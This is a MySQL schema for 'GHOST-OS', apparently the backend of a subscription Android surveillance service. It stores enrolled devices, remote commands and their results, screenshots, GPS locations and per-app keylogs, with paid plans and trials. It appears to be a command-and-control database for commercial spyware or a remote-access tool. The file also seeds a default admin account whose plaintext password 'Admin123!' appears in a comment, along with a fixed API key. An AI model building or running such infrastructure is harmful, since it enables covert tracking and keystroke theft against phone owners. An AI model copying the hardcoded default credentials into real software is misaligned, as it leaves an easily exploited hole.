-- Base de données GHOST-OS
CREATE DATABASE IF NOT EXISTS ghost_os;
USE ghost_os;

-- Utilisateurs
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    api_key VARCHAR(255) UNIQUE,
    account_type ENUM('free', 'premium', 'enterprise', 'admin') DEFAULT 'free',
    account_status ENUM('active', 'suspended', 'banned') DEFAULT 'active',
    trial_start DATETIME,
    trial_end DATETIME,
    subscription_start DATETIME,
    subscription_end DATETIME,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP NULL,
    last_ip VARCHAR(45),
    INDEX idx_api_key (api_key)
);

-- Appareils
CREATE TABLE devices (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    device_id VARCHAR(255) NOT NULL,
    device_name VARCHAR(255),
    model VARCHAR(100),
    android_version VARCHAR(50),
    is_online BOOLEAN DEFAULT FALSE,
    last_seen TIMESTAMP NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    UNIQUE KEY unique_device (user_id, device_id)
);

-- Commandes
CREATE TABLE commands (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    command VARCHAR(50) NOT NULL,
    params TEXT,
    status ENUM('pending', 'sent', 'executed', 'failed') DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    executed_at TIMESTAMP NULL,
    result TEXT,
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- Captures d'écran
CREATE TABLE screenshots (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    path VARCHAR(500),
    size INT,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- Localisations
CREATE TABLE locations (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    latitude DECIMAL(10,8),
    longitude DECIMAL(11,8),
    accuracy FLOAT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- Keylogs
CREATE TABLE keylogs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    app VARCHAR(255),
    text TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
);

-- Transactions
CREATE TABLE transactions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    tx_hash VARCHAR(255) UNIQUE,
    amount DECIMAL(10,2),
    currency VARCHAR(20),
    plan VARCHAR(50),
    status ENUM('pending', 'confirmed', 'failed') DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    confirmed_at TIMESTAMP NULL,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Activity logs
CREATE TABLE activity_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    action VARCHAR(100),
    details TEXT,
    ip VARCHAR(45),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_user (user_id)
);

-- Bans
CREATE TABLE bans (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    reason TEXT,
    banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    banned_by INT,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Admin par défaut (mot de passe: Admin123!)
INSERT INTO users (username, email, password_hash, account_type, api_key) VALUES
('admin', 'admin@ghost-os.com', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'admin', 'ghost_admin_key');
